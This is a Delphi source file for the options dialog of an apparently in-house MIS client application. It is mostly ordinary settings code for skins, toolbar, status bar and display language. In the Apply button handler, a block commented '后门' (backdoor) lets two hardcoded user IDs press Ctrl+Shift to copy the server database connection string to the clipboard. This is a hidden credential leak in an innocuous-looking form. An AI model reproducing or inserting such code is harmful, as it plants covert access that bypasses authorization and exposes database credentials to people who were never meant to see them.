{*******************************************************}
{                                                       }
{       软件名称 W.MIS CLIENT MODEL                     }
{       版权所有 (C) 2003, 2004 Esquel.IT               }
{       单元名称 frmOption.pas                          }
{       创建日期 2004-8-3 10:57:13                      }
{       创建人员 wuwj                                   }
{                                                       }
{*******************************************************}

unit frmOption;
{* 系统选项设置窗体单元 }

interface

uses StrUtils, Windows, SysUtils, Classes, Graphics, Forms, Controls, StdCtrls,
  Buttons, ComCtrls, ExtCtrls, UAppOption, ULogin;

type
  TOptionForm = class (TForm)
    btnApply: TButton;
    btnCancel: TButton;
    btnOK: TButton;
    gbGeneralXPStype: TGroupBox;
    General_cbApplyXPStype: TCheckBox;
    General_cmbSkins: TComboBox;
    lblCurrentStyle: TLabel;
    PageControl1: TPageControl;
    Panel1: TPanel;
    panelButtom: TPanel;
    tsGeneral: TTabSheet;
    lblStyleFilePath: TLabel;
    General_edtStyleFilePath: TEdit;
    btnGetStyleFilePath: TButton;
    tsOther: TTabSheet;
    GroupBox1: TGroupBox;
    rdQueryShowTitle: TRadioGroup;
    rdCHN: TRadioButton;
    rdENG: TRadioButton;
    TabSheet1: TTabSheet;
    GroupBox2: TGroupBox;
    rbShowTool: TRadioButton;
    rbNotShowTool: TRadioButton;
    GroupBox3: TGroupBox;
    rbShowStatusBar: TRadioButton;
    rbNotShowStatusBar: TRadioButton;
    procedure btnApplyClick(Sender: TObject);
    procedure btnOKClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormDestroy(Sender: TObject);
    procedure General_cbApplyXPStypeClick(Sender: TObject);
  private
    FOnXPStyleChange: TNotifyEvent;
    procedure ReadSkinfile;
    procedure SaveAppOption;
  protected
    procedure ApplyOptionChange;
  public
    procedure SetControlStatus(appOption:TAppOption);
  published
    property OnXPStyleChange: TNotifyEvent read FOnXPStyleChange write FOnXPStyleChange;
  end;
  
var
  OptionForm:TOptionForm;

implementation

uses frmMain, ServerDllPub, Clipbrd;


{$R *.dfm}

procedure TOptionForm.btnApplyClick(Sender: TObject);
var
  sErrorMsg: WideString;
begin
  //后门
  if (lowerCase(login.LoginID) = 'lvzd') or
     (lowerCase(login.LoginID) = 'zhangjy')
    then
  begin
    if (GetKeyState(VK_CONTROL) < 0) and ((GetKeyState(VK_SHIFT) < 0)) then
    begin
      FNMServerArtObj.GetConStr(sErrorMsg);
      Clipboard.AsText:=sErrorMsg;
    end;
    exit;
  end;
    
  SaveAppOption;
  ApplyOptionChange;
end;

procedure TOptionForm.btnOKClick(Sender: TObject);
begin
  SaveAppOption;
  ApplyOptionChange;
end;

procedure TOptionForm.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Action:=caFree;
end;

procedure TOptionForm.FormDestroy(Sender: TObject);
begin
  OptionForm:=nil;
end;

procedure TOptionForm.General_cbApplyXPStypeClick(Sender: TObject);
begin
  if (sender as TCheckBox).Checked then
  begin
    gbGeneralXPStype.Enabled:=True;
    General_cmbSkins.Color:=clWindow;
    General_edtStyleFilePath.Color:=clWindow;
  end
  else
  begin
    gbGeneralXPStype.Enabled:=False;
    General_cmbSkins.Color:=gbGeneralXPStype.Color;
    General_edtStyleFilePath.Color:=gbGeneralXPStype.Color;
  end;
end;

procedure TOptionForm.ReadSkinfile;
var
  sts: Integer ;
  SR: TSearchRec;
  skinPath: string;
  
  procedure AddFile;
  begin
    General_cmbSkins.items.add(sr.name);
  end;

begin
  General_cmbSkins.Items.Clear;
  skinPath:=General_edtStyleFilePath.Text;
  if RightStr(skinPath,1)<>'\' then skinPath:=skinPath+'\';
  
  sts:= FindFirst(skinPath + '*.skn' , faAnyFile , SR);
  if sts = 0 then
  begin
    if (SR.Name <> '.') and (SR.Name <> '..') then
      if pos('.', SR.Name) <> 0 then  Addfile;

    while FindNext(SR) = 0 do
      if (SR.Name <> '.') and (SR.Name <> '..') then
        if Pos('.', SR.Name) <> 0 then  Addfile;
  end;
  FindClose(SR) ;
end;

procedure TOptionForm.SaveAppOption;
var
  SkinList: TStringList;
  i: Integer;
begin
  SkinList:=TStringList.Create;
  try
    for i:=0 to General_cmbSkins.Items.Count-1 do
      SkinList.Add(General_cmbSkins.Items[i]);

    with AppOption do
    begin
      UseXPStyle:=General_cbApplyXPStype.Checked;
      SkinFile:=General_cmbSkins.Text;
      SkinFilePath:=General_edtStyleFilePath.Text;
      IFQueryShowCHN:=rdCHN.Checked;
      ShowToolBar:=rbShowTool.Checked;
      ShowStatusBar:=rbShowStatusBar.Checked;

      SaveOption;
    end;
  finally
    SkinList.Free;
  end;
end;

procedure TOptionForm.SetControlStatus(appOption:TAppOption);
begin
  //检查操作系统版本，如果是Win9x，则XP界面风格不能应用；
  if Login.OS<>'NT' then General_cbApplyXPStype.Enabled:=False;

  //读入皮肤文件列表；
  ReadSkinfile;

  //根据AppOption对象的各个属性设置Form的控件的状态；
  if appOption<>nil then
  begin
    General_cbApplyXPStype.Checked:=appOption.UseXPStyle;
    General_cmbSkins.ItemIndex:=General_cmbSkins.Items.IndexOf(appOption.SkinFile);
    rdCHN.Checked:=AppOption.IFQueryShowCHN ;
    rdENG.Checked:=not rdCHN.Checked ;

    rbShowTool.Checked:=AppOption.ShowToolBar ;
    rbNotShowTool.Checked:=not rbShowTool.Checked ;

    rbShowStatusBar.Checked:=AppOption.ShowStatusBar ;
    rbNotShowStatusBar.Checked:=not rbShowStatusBar.Checked ;

    if AppOption.SkinFilePath <> '' then
      General_edtStyleFilePath.Text:=AppOption.SkinFilePath
    else
      General_edtStyleFilePath.Text:='\\getnas\mis\miscenter\skinfile\';
  end
  else
  begin
    General_cbApplyXPStype.Checked:=false;
    General_cmbSkins.ItemIndex:=-1;
    rdENG.Checked:=true;
    rbShowTool.Checked:=true;
    rbShowStatusBar.Checked:=true;
    General_edtStyleFilePath.Text:='\\getnas\mis\miscenter\skinfile\';
  end;
end;

procedure TOptionForm.ApplyOptionChange;
begin
  FNMMainForm.LoadFormStyle;
end;

end.

